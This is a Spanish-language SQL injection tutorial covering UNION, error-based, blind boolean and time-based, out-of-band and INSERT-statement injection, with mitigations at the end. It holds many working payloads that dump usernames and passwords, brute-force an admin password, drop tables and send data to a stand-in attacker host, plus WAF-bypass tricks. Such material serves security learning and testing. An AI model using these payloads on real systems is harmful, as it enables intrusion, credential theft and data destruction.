# ¿Qué es SQL (Structured Query Language)?

SQL es el lenguaje estándar utilizado para comunicarse con bases de datos relacionales. Permite realizar operaciones como consultar datos, actualizarlos, borrarlos e insertar nuevos. En una aplicación web típica, el backend (código del lado del servidor) es el que construye y ejecuta consultas SQL para interactuar con la base de datos, basándose a menudo en la entrada del usuario.

### ¿Qué es una SQL Injection (SQLi)?

Una SQL Injection es una vulnerabilidad de seguridad que ocurre cuando un atacante puede manipular o "inyectar" código SQL malicioso en las consultas que una aplicación envía a su base de datos. Esto sucede generalmente porque la aplicación concatena directamente la entrada del usuario en las sentencias SQL sin una validación o sanitización adecuada, o sin usar mecanismos seguros como las consultas parametrizadas.

**Impacto Potencial de una SQLi Exitosa:**

- **Robo de Datos:** Acceso no autorizado a información sensible (datos de usuarios, PII, credenciales, secretos de la aplicación, etc.).
- **Modificación de Datos:** Alterar o corromper datos existentes en la base de datos.
- **Eliminación de Datos:** Borrar información, tablas o incluso la base de datos completa.
- **Bypass de Autenticación:** Eludir mecanismos de login.
- **Escalada de Privilegios:** Obtener permisos de administrador dentro de la aplicación o la base de datos.
- **Ejecución Remota de Comandos (RCE):** En algunos casos, dependiendo de la configuración de la base de datos y los permisos del usuario de la BD, se puede llegar a ejecutar comandos del sistema operativo en el servidor de la base de datos.

### Tipos Principales de SQL Injection

1. **In-band SQLi (Dentro de Banda):** El atacante usa el mismo canal de comunicación para lanzar el ataque y obtener los resultados.
   - **Union-based SQLi:** Utiliza el operador `UNION` de SQL para combinar los resultados de la consulta original con los resultados de una consulta inyectada, mostrando los datos directamente en la respuesta de la aplicación.
   - **Error-based SQLi:** El atacante fuerza a la base de datos a generar mensajes de error que contienen los datos que se quieren exfiltrar.
2. **Inferential SQLi (Blind SQLi / A Ciegas):** El atacante no recibe los datos directamente en la respuesta. En su lugar, envía consultas y observa el comportamiento de la aplicación (o el tiempo de respuesta) para inferir información bit a bit o carácter a carácter.
   - **Boolean-based Blind SQLi:** Se inyectan condiciones SQL que resultan en `VERDADERO` o `FALSO`, y la aplicación responde de manera diferente para cada caso (e.g., muestra un mensaje, carga una página diferente).
   - **Time-based Blind SQLi:** Se inyectan comandos SQL que causan un retraso condicional en la respuesta del servidor, permitiendo inferir información.
3. **Out-of-Band SQLi (OOB SQLi):** El atacante fuerza a la base de datos a realizar una conexión de red saliente (e.g., DNS, HTTP) a un servidor controlado por él, exfiltrando datos a través de esta conexión. Es menos común y depende de funcionalidades específicas de la base de datos y la configuración de red.

### Sintaxis SQL Básica Relevante

- `SELECT columnas FROM tabla WHERE condicion ORDER BY columna ASC/DESC LIMIT offset, cantidad`
- `UNION SELECT ...`: Combina resultados de dos consultas (deben tener el mismo número de columnas y tipos de datos compatibles).
- `UPDATE tabla SET columna=valor WHERE condicion`
- `DELETE FROM tabla WHERE condicion`
- `INSERT INTO tabla (col1, col2) VALUES (val1, val2)`
- **Comentarios SQL:**
  - `--` (MySQL, SQL Server, PostgreSQL - **necesita un espacio después de los guiones** o un salto de línea)
  - `#` (MySQL - hasta el final de la línea)
  - `/* ... */` (Comentario multilínea, estándar SQL)
  - `;` (Terminador de sentencia, puede permitir _stacked queries_ o consultas apiladas).

### Identificando Vulnerabilidades SQLi

**Contexto de Ejemplo:** Una URL que muestra artículos: `https://vulnerable.com/article?id=1`

**Consulta SQL Interna (Supuesta):**

```sql
SELECT * FROM articles WHERE released=1 AND id=1;
```

El valor del parámetro `id` se está insertando directamente en la consulta.

**Pruebas Iniciales (Inyección en un parámetro numérico):**

1. **Comillas Simples (`'`):**
   - `?id=1'`
   - Si es vulnerable y espera un número, esto romperá la sintaxis SQL (e.g., `id=1'`) y probablemente cause un error en la base de datos, que podría o no ser visible en la página.
2. **Operaciones Matemáticas (si el parámetro es numérico):**
   - `?id=2-1` (Debería devolver el mismo contenido que `?id=1`)
   - `?id=1*1` (Debería devolver el mismo contenido que `?id=1`)
3. **Condiciones Booleanas Clásicas:**
   - `?id=1 AND 1=1` (Debería devolver el contenido de `id=1`)
   - `?id=1 AND 1=2` (No debería devolver nada o una página diferente)
   - **Con comillas para escapar (si el parámetro se trata como string o para romper la lógica numérica):**
     - `?id=1' AND 1=1;--` (Devuelve resultado si `id=1` existe y la query original es verdadera)
     - `?id=1' AND 1=2;--` (No devuelve nada)
     - `?id=1" AND 1=1;--` (Si usa comillas dobles)
4. **Observar Comportamiento:**
   - Mensajes de error SQL explícitos (¡bingo!).
   - Cambios en el contenido de la página.
   - Diferencias en los tiempos de respuesta.

### SQLi In-band: Explotación Basada en UNION

Esta técnica permite extraer datos directamente si la aplicación muestra los resultados de la consulta.

1. **Neutralizar la Consulta Original:** Para que los resultados de nuestra `UNION` sean los únicos (o los primeros) mostrados, a menudo necesitamos que la parte original de la consulta no devuelva resultados o devuelva un error controlado.

   - Si `id` es numérico: `?id=0` o `?id=-1` (asumiendo que no existen IDs negativos o cero).
   - Si `id` es un string (o para romper la lógica): `?id=1'` (para cerrar una comilla)
   - Ejemplo: `?id=0' UNION SELECT ... ;--`
2. **Determinar el Número de Columnas:** El `UNION SELECT` requiere que ambas consultas tengan el mismo número de columnas.

   - **Usando `ORDER BY`:**
     - `?id=0' ORDER BY 1;--`
     - `?id=0' ORDER BY 2;--`
     - ... Incrementar el número hasta que la aplicación devuelva un error (e.g., "Unknown column in order clause" o similar). El número anterior al error es el número de columnas.
   - **Usando `UNION SELECT NULL,NULL,...`:**
     - `?id=0' UNION SELECT NULL;--`
     - `?id=0' UNION SELECT NULL,NULL;--`
     - ... Incrementar el número de `NULL`s hasta que la consulta se ejecute sin error. `NULL` se usa porque suele ser compatible con la mayoría de los tipos de datos.
3. **Identificar Columnas que Muestran Datos:** Una vez conocido el número de columnas (e.g., 4), averiguar cuáles de ellas se muestran en la página.

   - `?id=0' UNION SELECT 'a','b','c','d';--` (o números, o `NULL`s con un string de prueba)
   - Observar la página para ver dónde aparecen "a", "b", "c", "d". Si, por ejemplo, "b" y "d" aparecen, esas son las columnas que podemos usar para exfiltrar datos.
4. **Extraer Información de la Base de Datos (Ejemplos para MySQL/MariaDB):** `information_schema` es una base de datos que contiene metadatos sobre todas las demás bases de datos, tablas y columnas. (Otros SGBD tienen equivalentes: `sys.` en SQL Server, `all_tables`/`all_tab_columns` en Oracle).

   - **Listar Bases de Datos (Esquemas):** (Asumiendo que la columna 2 es visible) `?id=0' UNION SELECT NULL,GROUP_CONCAT(SCHEMA_NAME),NULL,NULL FROM information_schema.SCHEMATA;--` (`GROUP_CONCAT` es específico de MySQL/MariaDB para agrupar múltiples resultados en una sola cadena. SQL Server: `STRING_AGG`. Oracle: `LISTAGG`).
   - **Listar Tablas de una Base de Datos (e.g., `mi_db_secreta`):** `?id=0' UNION SELECT NULL,GROUP_CONCAT(TABLE_NAME),NULL,NULL FROM information_schema.TABLES WHERE TABLE_SCHEMA='mi_db_secreta';--`
   - **Listar Columnas de una Tabla (e.g., `usuarios` en `mi_db_secreta`):** `?id=0' UNION SELECT NULL,GROUP_CONCAT(COLUMN_NAME),NULL,NULL FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mi_db_secreta' AND TABLE_NAME='usuarios';--`
   - **Extraer Datos de una Tabla (e.g., `usuario` y `contrasena` de la tabla `usuarios`):** `?id=0' UNION SELECT NULL,GROUP_CONCAT(CONCAT_WS(':', usuario, contrasena)),NULL,NULL FROM mi_db_secreta.usuarios;--` (Usando `CONCAT_WS` para concatenar usuario y contraseña con un delimitador `:`) O si solo puedes mostrar un valor a la vez en una columna visible y necesitas dos columnas para usuario y pass: `?id=0' UNION SELECT NULL, usuario, contrasena, NULL FROM mi_db_secreta.usuarios LIMIT 0,1;--` (para el primer usuario)

### SQLi In-band: Explotación Basada en Errores

Si la aplicación muestra mensajes de error detallados de la base de datos, se pueden usar funciones específicas del SGBD para forzar que los resultados de una consulta se muestren dentro del mensaje de error.

- **MySQL:** `EXTRACTVALUE()`, `UPDATEXML()`
  - `?id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) ;--` (Muestra la versión de MySQL)
  - `?id=1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1) ;--` (Muestra la base de datos actual)
- **SQL Server:** Usar conversiones de tipo que fallen.
  - `?id=1' AND 1=(SELECT CAST(@@version AS INT));--` (El error mostrará la versión)
- **Oracle:** `CTXSYS.DRITHSX.SN`, `DBMS_XSLPROCESSOR.READ_DTD`, `UTL_INADDR.GET_HOST_NAME`
  - `?id=1' AND 1=XMLType((select banner from v$version where banner like 'Oracle%'));--`

### SQLi Inferencial: Boolean-based Blind

Se usa cuando la aplicación no muestra datos directamente ni errores detallados, pero su comportamiento cambia si una condición inyectada es verdadera o falsa.

**Contexto de Ejemplo:** `https://vulnerable.com/api/checkuser?username=test` Respuesta si el usuario "test" existe: `{"taken":true}` Respuesta si el usuario "test" no existe: `{"taken":false}`

**Pruebas de Inyección:**

- `?username=test' AND 1=1;--` -> Respuesta: `{"taken":true}` (si "test" existe)
- `?username=test' AND 1=2;--` -> Respuesta: `{"taken":false}` (o un error genérico, pero diferente a la respuesta verdadera)

**Extrayendo Información Carácter por Carácter (Ejemplo: nombre de la base de datos):** Se usan funciones como `SUBSTRING()`, `ASCII()`, `CHAR_LENGTH()`.

1. **Obtener longitud del nombre de la base de datos:** `?username=test' AND LENGTH(DATABASE()) = 1;--` `?username=test' AND LENGTH(DATABASE()) = 2;--` ... hasta que la respuesta sea `{"taken":true}`. Digamos que es 7.
2. **Obtener el primer carácter:** `?username=test' AND ASCII(SUBSTRING(DATABASE(), 1, 1)) > 100 ;--` (Prueba si el valor ASCII es > 100) `?username=test' AND ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115 ;--` (Prueba si es 's') (Iterar usando búsqueda binaria o lineal para adivinar cada carácter)
3. **Automatizar con un script o Burp Intruder.**

**Ejemplo para encontrar columnas (como en tus notas):** `?username=usuario_valido' AND (SELECT 1 FROM information_schema.COLUMNS WHERE COLUMN_NAME LIKE 'p%' AND TABLE_SCHEMA='nombre_db' AND TABLE_NAME='usuarios' LIMIT 1)=1;--` Esto devolvería `true` si existe al menos una columna que empieza por 'p' en la tabla 'usuarios' de la base de datos 'nombre_db'. Se iteraría `LIKE 'pa%'`, `LIKE 'pas%'`, etc.

### SQLi Inferencial: Time-based Blind

Se usa cuando no hay ningún cambio visible en la respuesta. Se inyectan comandos que causan un retraso condicional.

- **MySQL:** `SLEEP()` `?id=1' AND IF( (SELECT @@version LIKE '5%'), SLEEP(5), 0 );--` (Si la versión de MySQL empieza por 5, espera 5 segundos).
- **PostgreSQL:** `pg_sleep()` `?id=1'; SELECT CASE WHEN (SUBSTRING((SELECT version()),1,10) LIKE 'PostgreSQL%') THEN pg_sleep(5) ELSE pg_sleep(0) END;--`
- **SQL Server:** `WAITFOR DELAY` `?id=1'; IF (SUBSTRING(@@version,1,15) LIKE 'Microsoft SQL%') WAITFOR DELAY '0:0:5';--`
- **Oracle:** `DBMS_LOCK.SLEEP()` o una subconsulta pesada. `?id=1' AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS,ALL_OBJECTS,ALL_OBJECTS WHERE ROWNUM < (CASE WHEN (ASCII(SUBSTR((SELECT BANNER FROM V$VERSION WHERE ROWNUM=1),1,1))=79) THEN 1 ELSE 9999 END) );--` (Si el primer carácter de la versión es 'O', la subconsulta es rápida, si no, es muy lenta).

### SQLi Out-of-Band (OOB)

Requiere que el servidor de base de datos pueda realizar peticiones de red salientes (DNS, HTTP). Es potente pero situacional.

- **Oracle:** `UTL_HTTP.REQUEST()`, `UTL_INADDR.GET_HOST_ADDRESS()`, `DBMS_LDAP.INIT()` `?id=1' UNION SELECT UTL_HTTP.REQUEST('http://atacante-collab.com/' || (SELECT user FROM DUAL)) FROM DUAL;--`
- **SQL Server:** `xp_dirtree`, `xp_fileexist`, `xp_cmdshell` (si está habilitado y hay permisos) para forzar interacciones de red. `?id=1'; EXEC master.dbo.xp_dirtree '\\\\atacante-collab.com\\test';--` (Petición DNS/SMB)
- **PostgreSQL:** `COPY ... TO PROGRAM 'curl ...'` (si hay permisos de superusuario).

### Database Fingerprinting (Identificación del SGBD)

Conocer el tipo de base de datos ayuda a elegir los payloads correctos.

- **Mensajes de Error:** Suelen ser específicos del SGBD.
- **Funciones Específicas:**
  - `@@version` (MySQL, SQL Server)
  - `VERSION()` (MySQL, PostgreSQL)
  - `SELECT banner FROM v$version` (Oracle)
- **Comentarios:** `--` (MySQL, SQL Server, Oracle, PostgreSQL), `#` (MySQL), `/**/` (Todos).
- **Concatenación de Strings:**
  - `CONCAT(str1, str2)` (MySQL), `str1 || str2` (Oracle, PostgreSQL), `str1 + str2` (SQL Server).
- **Diferencias en `SELECT` sin `FROM`:**
  - `SELECT 1` (MySQL, PostgreSQL, SQL Server)
  - `SELECT 1 FROM DUAL` (Oracle)

### Stacked Queries (Consultas Apiladas)

Usar `;` para terminar una consulta e iniciar otra. Permite ejecutar comandos DML (Data Manipulation Language) como `UPDATE`, `DELETE`, `INSERT`, o incluso DDL (Data Definition Language) como `DROP TABLE` si los permisos lo permiten. `?id=1'; DROP TABLE usuarios;--` **Nota:** Muchos APIs/drivers de bases de datos no permiten o deshabilitan la ejecución de múltiples sentencias en una sola llamada por seguridad.

### Técnicas Comunes de Bypass de WAF/Filtros (Breve)

- **Comentarios:** `/*! ... */` (comentarios versionados de MySQL), `SELECT/*comentario*/columna...`
- **Codificación:** URL, Hex, `CHAR()` (e.g., `CHAR(83,69,76,69,67,84)` para `SELECT` en MySQL).
- **Variación de Mayúsculas/Minúsculas:** `SeLeCt`, `uNiOn`.
- **Alternativas a Espacios:** `%09` (tab), `%0a` (LF), `%0d` (CR), `/**/`, `+`, `()` (en algunos contextos).
- **Palabras Clave Alternativas/Ofuscación:** `UNION ALL SELECT` en lugar de `UNION SELECT`, usar funciones equivalentes, añadir caracteres innecesarios que son ignorados.
- **Buffer Overflow:** Raro, pero a veces payloads muy largos pueden romper WAFs.

### Herramienta Principal: `sqlmap`

`sqlmap` es la herramienta automatizada de referencia para detectar y explotar SQLi. `sqlmap -u "https://vulnerable.com/article?id=1" --dbs --batch` (Detecta, enumera bases de datos, y usa opciones por defecto). `sqlmap` puede manejar la mayoría de los tipos de SQLi, fingerprinting, y bypasses.

### Mitigaciones Clave Contra SQLi

1. **Consultas Parametrizadas (Prepared Statements):** La defensa más robusta. El código SQL se define primero, y luego los datos del usuario se pasan como parámetros. La base de datos trata los parámetros como datos, no como código ejecutable.
2. **Procedimientos Almacenados (Stored Procedures):** Si se implementan correctamente y no construyen SQL dinámico internamente con input no sanitizado.
3. **Validación de Entradas (Whitelist):** Rechazar cualquier entrada que no cumpla con el formato esperado (e.g., si se espera un número, que sea un número).
4. **Codificación de Salida (Escaping):** Escapar caracteres especiales específicos de SQL antes de incluir input en una consulta. Es más propenso a errores que las consultas parametrizadas y debe hacerse con mucho cuidado según el contexto y el SGBD.
5. **Principio de Mínimos Privilegios:** El usuario de la base de datos que usa la aplicación web debe tener solo los permisos estrictamente necesarios (e.g., solo `SELECT` en ciertas tablas, no permisos de `DROP` o acceso a `information_schema` si no es vital).
6. **Web Application Firewalls (WAFs):** Pueden ayudar a bloquear ataques SQLi conocidos, pero no deben ser la única defensa, ya que pueden ser bypassados.
7. **ORM (Object-Relational Mappers):** Suelen usar consultas parametrizadas por defecto, lo que ayuda a prevenir SQLi, pero configuraciones incorrectas o uso de "raw SQL" a través del ORM pueden reintroducir la vulnerabilidad.

---



Estas técnicas se utilizan cuando las formas más directas de SQLi (Union-based, Error-based simple) no son viables, ya sea porque la aplicación no devuelve errores detallados ni refleja directamente los datos de la base de datos.

### SQLi Inferencial Avanzado: Time-based Blind (Basado en Tiempos)

El **Time-based Blind SQLi** se explota cuando no hay una diferencia observable en el contenido de la respuesta de la aplicación, independientemente de si una condición inyectada es verdadera o falsa. En su lugar, se inyectan comandos SQL que introducen un retraso condicional en la respuesta del servidor. Si la respuesta tarda más de lo normal, se infiere que la condición fue verdadera.

**Principio Clave:** Usar funciones de la base de datos que pausan la ejecución.

- **MySQL/MariaDB:** `SLEEP(segundos)`
- **PostgreSQL:** `pg_sleep(segundos)`
- **SQL Server:** `WAITFOR DELAY '0:0:segundos'`
- **Oracle:** `DBMS_LOCK.SLEEP(segundos)` o consultas computacionalmente intensivas condicionales.

**Ejemplo Inicial de Detección (MySQL):** Dado un parámetro vulnerable `id`: `https://vulnerable.com/item?id=1`

Payload de prueba: `?id=1' OR SLEEP(5);--` (Si se usa comilla simple) `?id=1 OR SLEEP(5);--` (Si es numérico)

Si el servidor tarda aproximadamente 5 segundos más en responder, es probable que sea vulnerable.

**Enumeración de Bases de Datos (MySQL - carácter por carácter):** Se usa una condición `IF` o `CASE` para ejecutar `SLEEP` solo si la condición es verdadera.

- **Paso 1: Confirmar si existe una base de datos que empiece por 's'.** `?id=1' OR IF((SELECT 1 FROM information_schema.SCHEMATA WHERE SCHEMA_NAME LIKE 's%' LIMIT 1)=1, SLEEP(5), 0);--` (Si existe al menos una DB que empieza por 's', la consulta `(SELECT 1 ...)` devuelve 1, la condición `1=1` es verdadera, y se ejecuta `SLEEP(5)`).
- **Paso 2: Extraer el primer carácter del nombre de la primera base de datos.**

  - ¿Es 'a'? `?id=1' OR IF(ASCII(SUBSTRING((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 0,1),1,1)) = 97, SLEEP(5), 0);--` (97 es ASCII de 'a')
  - ¿Es 'b'? `?id=1' OR IF(ASCII(SUBSTRING((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 0,1),1,1)) = 98, SLEEP(5), 0);--`
  - ... y así sucesivamente, o usando rangos (`> <`) para acelerar.

**Enumerar Tablas (MySQL):** `?id=1' OR IF((SELECT 1 FROM information_schema.TABLES WHERE TABLE_SCHEMA='nombre_db_conocida' AND TABLE_NAME LIKE 'u%' LIMIT 1)=1, SLEEP(5), 0);--`

**Enumerar Columnas (MySQL):** `?id=1' OR IF((SELECT 1 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='nombre_db_conocida' AND TABLE_NAME='tabla_conocida' AND COLUMN_NAME LIKE 'p%' LIMIT 1)=1, SLEEP(5), 0);--`

**Bruteforce de Datos (Contraseña del usuario 'ben', MySQL):** `?id=1' OR IF((SELECT 1 FROM usuarios_tabla WHERE username = 'ben' AND password LIKE 'd%' LIMIT 1)=1, SLEEP(5), 0);--` (Esto verifica si la contraseña de 'ben' empieza con 'd').

**Automatización:** Este proceso es tedioso manualmente. Se suelen usar scripts (e.g., Python con `requests` y midiendo `response.elapsed.total_seconds()`) o herramientas como `sqlmap` (`sqlmap -u "URL" --technique=T --dbms=mysql ...`) para automatizar la exfiltración.

### SQLi en Consultas `INSERT`

A veces, la entrada del usuario se inserta directamente en una sentencia `INSERT` en lugar de un `SELECT`. Esto abre diferentes vectores de inyección.

**Contexto de un `INSERT` Vulnerable:** La aplicación permite añadir comentarios:

```sql
INSERT INTO comments (date_posted, author_name, comment_text) VALUES ('2025-06-03', 'usuario_input', 'comentario_input');
```

Si `usuario_input` o `comentario_input` no se sanitizan correctamente.

#### 1. SQLi en `INSERT`: Explotación Basada en Errores

Si la aplicación muestra errores de la base de datos (o si los datos insertados, incluyendo el resultado de una subconsulta inyectada, se muestran en otro lugar), se puede exfiltrar información.

**Inyección Básica para Romper la Sintaxis:** Si el atacante introduce en el campo `author_name`: `atacante_nombre', 'comentario_falso'); --` La consulta se convertiría en:

```sql
INSERT INTO comments (date_posted, author_name, comment_text) 
VALUES ('2025-06-03', 'atacante_nombre', 'comentario_falso'); -- ', 'comentario_input_original');
```

Aquí, el atacante cierra el string de `author_name`, provee un valor para `comment_text`, cierra el `VALUES()` y la sentencia `INSERT`, y comenta el resto.

**Exfiltración de Datos (MySQL - inyectando en el segundo campo `author_name`):**

- **Obtener Versión de MySQL:** Payload para `author_name`: `test_author', (SELECT version()), 'test_comment`); -- `Consulta resultante (si el`INSERT`tiene 3 columnas para los valores):`INSERT INTO comments (col1, col2_author, col3_comment) VALUES ('valor_original1', 'test_author', (SELECT version()), 'test_comment`); -- ', 'valor_original3');` Si `(SELECT version())` causa un error de tipo de dato o si el valor se muestra después, se obtiene la versión. _Nota: El número de valores inyectados debe coincidir con el número de columnas que la sentencia `INSERT` espera para los valores que estás manipulando._
- **Enumerar Bases de Datos (Schemas):** Payload para `author_name`: `test_author', (SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA), 'test_comment`); -- `
- **Enumerar Tablas de una Base de Datos (`mi_db`):** Payload para `author_name`: `test_author', (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='mi_db'), 'test_comment`); -- `
- **Enumerar Columnas de una Tabla (`usuarios` en `mi_db`):** Payload para `author_name`: `test_author', (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mi_db' AND TABLE_NAME='usuarios'), 'test_comment`); -- `
- **Extraer Datos (e.g., de `mi_db.usuarios`):** Payload para `author_name`: `test_author', (SELECT GROUP_CONCAT(CONCAT_WS(':', username, password)) FROM mi_db.usuarios), 'test_comment`); -- `

**Consideraciones para INSERT SQLi (Error-based):**

- El número de valores en la inyección debe corresponder a las columnas esperadas por la sentencia `INSERT` a partir del punto de inyección.
- Los tipos de datos deben ser compatibles, o la subconsulta debe devolver un tipo que pueda ser coaccionado/convertido, o el error mismo debe filtrar el dato.
- La aplicación debe reflejar el error de la base de datos o los datos insertados (que ahora contienen la información exfiltrada).
- Si `GROUP_CONCAT` devuelve demasiados datos, puede exceder límites o ser truncado. Usa `LIMIT` en las subconsultas para extraer datos por partes.

#### 2. SQLi en `INSERT`: Explotación Time-based Blind

Si la inyección en `INSERT` no produce errores visibles ni refleja los datos, se puede recurrir a técnicas time-based.

**Inyección Básica para Confirmar (MySQL):** Si el campo `author_name` es vulnerable: Payload para `author_name`: `atacante_nombre', (SELECT SLEEP(5)), 'comentario_original`); -- ` Si la inserción tarda 5 segundos más, es vulnerable.

**Extraer Versión (MySQL - primer carácter):** Payload para `author_name`: `atacante_nombre', (SELECT IF(ASCII(SUBSTRING(VERSION(),1,1)) = 56, SLEEP(5), 0)), 'comentario_original`); -- ` (Esto prueba si el primer carácter de la versión es '8', cuyo ASCII es 56).

**Verificación Completa de la Versión (ejemplo de tus notas):** Payload para `author_name`: `atacante_nombre', (SELECT SLEEP(5) WHERE VERSION() = '8.0.36-0ubuntu0.22.04.1'), 'comentario_original`); -- ` _Nota: Este payload es muy específico. Es más común iterar carácter por carácter._

**Automatización:** Al igual que con Time-based Blind SQLi en `SELECT`, la exfiltración de datos carácter por carácter se automatiza con scripts (Python) o herramientas como `sqlmap` (que también soporta inyecciones en `INSERT` con la opción `--forms` si detecta un formulario, o especificando el punto de inyección).

**Ejemplo de Exfiltración de Contraseña (carácter por carácter):** Asumimos un `INSERT INTO logs (user_agent, log_message) VALUES ('input_user_agent', 'input_log_message');` Payload para `input_user_agent` (extrayendo primer carácter de contraseña de 'admin'): `hacker_ua', (SELECT IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 0,1),1,1)) = 97, SLEEP(5), 0) ), 'log_message'); --` (Verifica si el primer carácter de la contraseña del admin es 'a').

### Consideraciones Adicionales

- **Apóstrofes y Comillas:** Presta atención a si la aplicación encierra los valores en apóstrofes (`'`) o comillas dobles (`"`). Tu inyección debe cerrarlas correctamente.
- **Contexto de la Inyección:** Si la inyección es en un valor numérico dentro de un `INSERT`, no necesitarás cerrar comillas, solo romper la lógica numérica e inyectar. `INSERT INTO stats (user_id, visits) VALUES (123, input_visits);` Payload para `input_visits`: `99); --` (si se puede apilar) o `99 + (SELECT CASE WHEN ... THEN SLEEP(5) ELSE 0 END) --` (si se pueden inyectar subconsultas en valores numéricos).

### Mitigaciones

Las mitigaciones son las mismas que para otras SQLi:

1. **Consultas Parametrizadas (Prepared Statements):** La defensa más efectiva.
2. **Validación Estricta de Entradas:** Asegurarse de que los datos se ajustan al tipo y formato esperados.
3. **Mapeo de Entradas a Valores Seguros (ORM):** Usar ORMs correctamente suele prevenir estas inyecciones.
4. **Principio de Mínimos Privilegios:** El usuario de base de datos de la aplicación web no debería tener permisos para acceder a `information_schema` si no es estrictamente necesario, ni para usar `SLEEP()` u otras funciones peligrosas.
